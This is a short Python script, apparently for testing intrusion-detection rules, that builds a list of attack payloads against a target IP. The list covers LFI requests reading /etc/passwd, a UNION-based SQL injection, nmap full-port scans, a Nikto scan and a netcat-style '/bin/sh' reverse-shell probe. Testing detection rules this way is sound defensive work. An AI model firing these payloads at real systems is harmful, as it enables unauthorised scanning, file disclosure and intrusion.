#!/usr/bin/env python

class TestRules():
    def __init__(self, target):
        self.payloads = []
        self._target = target
        self._sudo  = "/usr/bin/sudo"
        self._nmap = "/usr/bin/nmap"
        self._niktobin = "/pentest/scanners/nikto-2.1.4/nikto.pl"
        self._niktocnf = "/pentest/scanners/nikto-2.1.4/nikto.conf"

    def getPayloads(self):
        ### Simple LFI
        self.payloads.append([
            "Simple LFI",
            "socket",
            80,
            "GET /index.php?page=../../../etc/passwd HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041202 Firefox/1.0\r\n\r\n"
            ])

        ### LFI using NULL byte
        self.payloads.append([
            "LFI using NULL byte",
            "socket",
            80,
            "GET /index.php?page=../../../etc/passwd%00 HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041202 Firefox/1.0\r\n\r\n"
            ])

        ### Full SYN Scan
        self.payloads.append([
            "Full SYN Scan",
            "command",
            [self._sudo, self._nmap, '-sS', '-p-', self._target]
            ])

        ### Full Connect() Scan
        self.payloads.append([
            "Full Connect() Scan",
            "command",
            [self._nmap, '-sT', '-p-', self._target]
            ])

        ### SQL Injection
        self.payloads.append([
            "SQL Injection",
            "socket",
            80,
            "GET /form.php?q=1+UNION+SELECT+VERSION%28%29 HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
            ])

        ### Netcat Reverse Shell
        self.payloads.append([
            "Netcat Reverse Shell",
            "socket",
            22,
            "/bin/sh"
            ])

        ### Nikto Scan
        self.payloads.append([
            "Nikto Scan",
            "command",
            [self._sudo, self._niktobin, '-config', self._niktocnf, '-h', self._target, '-Plugins', 'cgi']
            ])

        return self.payloads

if __name__ == "__main__":
    print TestRules("192.168.100.48").getPayloads()